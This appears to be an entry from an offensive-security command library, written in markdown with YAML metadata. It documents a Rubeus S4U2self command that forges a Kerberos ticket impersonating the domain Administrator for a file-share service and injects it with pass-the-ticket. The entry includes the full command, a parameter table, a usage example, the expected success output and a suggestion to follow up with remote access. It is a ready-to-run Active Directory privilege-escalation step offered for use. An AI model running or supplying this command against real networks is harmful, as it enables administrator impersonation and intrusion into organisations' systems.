---
id: 2f1e1ef8-d956-4503-825a-7695525ca5d8
name: rubeus-s4u-self-impersonate-admin-ptt-base64
type: command
executor: powershell
data: >-
  Rubeus.exe s4u /self /nowrap /impersonateuser:"Administrator"
  /altservice:"cifs/srv001" /ticket:"$_BASE64_TGT" /ptt
output: null
created_at: '2023-04-06T03:56:07.821453+00:00'
updated_at: '2023-04-10T20:36:07.954586+00:00'
platforms:
  - Windows
tags:
  - kerberos
  - s4u
  - ptt
verified: true
validated: true
---

# rubeus-s4u-self-impersonate-admin-ptt-base64

## Command

```powershell
Rubeus.exe s4u /self /nowrap /impersonateuser:"Administrator" /altservice:"cifs/srv001" /ticket:"$_BASE64_TGT" /ptt
```

## Description

Combines S4U2self ticket generation with immediate PTT injection to impersonate a domain admin for a target service, streamlining privilege escalation.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| /self | S4U2self mode | Yes |
| /nowrap | No base64 wrap on output | Yes |
| /impersonateuser:"Administrator" | Target user to impersonate | Yes |
| /altservice:"cifs/srv001" | Target SPN (short form) | Yes |
| /ticket:"$_BASE64_TGT" | Input TGT | Yes |
| /ptt | Auto-inject generated ticket | Yes |

## Examples

### Basic Usage

```powershell
Rubeus.exe s4u /self /nowrap /impersonateuser:"Administrator" /altservice:"cifs/srv001" /ticket:"doIF..." /ptt
```

## Expected Output

```
[+] Generated ticket and injected successfully
[+] Now impersonating Administrator for cifs/srv001
```
Test with remote access commands post-injection.

## Related

- [[commands/rubeus-ptt-inject-base64-ticket]]
- [[procedures/Kerberos-S4U2Self-Privilege-Escalation]]
